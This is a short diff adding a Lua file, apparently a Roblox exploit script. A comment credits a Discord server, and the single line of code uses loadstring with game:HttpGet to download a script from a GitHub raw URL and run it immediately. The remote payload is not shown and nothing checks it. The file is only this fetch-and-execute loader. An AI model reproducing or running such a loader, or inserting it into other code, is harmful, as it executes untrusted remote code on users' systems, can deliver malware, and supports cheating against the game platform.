@@ -1,0 +1,4 @@
+-- ts file was generated at discord.gg/25ms
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/obfalchx/zisRblx/refs/heads/main/ZisV10"))()
